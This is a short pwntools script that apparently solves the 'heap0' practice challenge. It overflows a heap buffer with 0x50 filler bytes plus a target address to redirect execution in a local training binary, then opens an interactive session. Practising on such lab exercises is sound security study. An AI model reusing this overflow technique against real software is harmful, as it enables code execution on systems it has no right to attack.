from pwn import *

x = b"A" * 0x50
x += p32(0x080484b6)

p = process(["./heap0", x])

p.interactive()
